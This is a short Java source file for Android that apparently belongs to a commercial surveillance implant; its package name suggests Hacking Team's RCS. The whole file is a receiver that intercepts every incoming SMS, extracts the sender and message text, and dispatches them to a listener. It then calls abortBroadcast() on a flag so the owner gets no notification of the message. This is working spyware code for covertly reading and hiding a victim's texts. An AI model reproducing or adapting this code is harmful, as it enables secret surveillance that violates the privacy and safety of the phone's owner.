package com.ht.RCSAndroidGUI.listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.ht.RCSAndroidGUI.Sms;

public class BroadcastMonitorSms extends BroadcastReceiver {
	private static final String TAG = "BroadcastMonitorSms";
	
	// Apparentemente la notifica di SMS inviato non viene inviata di proposito
	@Override
	public void onReceive(Context context, Intent intent) {
		Bundle bundle = intent.getExtras();

		if (bundle == null)
			return;
		
		SmsMessage[] msgs = null;

		// Prendiamo l'sms
		Object[] pdus = (Object[]) bundle.get("pdus");
		msgs = new SmsMessage[pdus.length];

		for (int i = 0; i < msgs.length; i++) {
			msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
			
			int result = ListenerSms.self().dispatch(new Sms(msgs[i].getOriginatingAddress(),  
					msgs[i].getMessageBody().toString(), System.currentTimeMillis(), false));
						
			// 1 means "remove notification for this sms"
			if ((result & 1) == 1) {
				abortBroadcast();
			}
		}
	}
}
